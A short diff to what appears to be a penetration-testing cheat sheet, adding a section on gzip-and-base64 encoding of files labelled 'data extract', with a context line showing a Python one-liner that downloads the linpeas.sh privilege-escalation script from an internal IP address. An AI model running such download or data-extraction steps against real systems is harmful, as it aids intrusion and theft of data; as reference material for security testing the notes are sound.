@@ -190,3 +190,18 @@ python3 -c "import urllib.request;u = 'http://10.33.1.154:8080/linpeas.sh';urlli
 
 
 ![image](https://user-images.githubusercontent.com/5285547/157315084-108bc212-efa1-42f5-9d2c-43c3400c0066.png)
+
+
+## Gzip a file with base64 (data extract)
+
+Encode
+
+```
+cat file | gzip | base64 -w0 > codedfile
+```
+
+Decode
+
+```
+cat codedfile | base64 -d | gunzip > file
+```
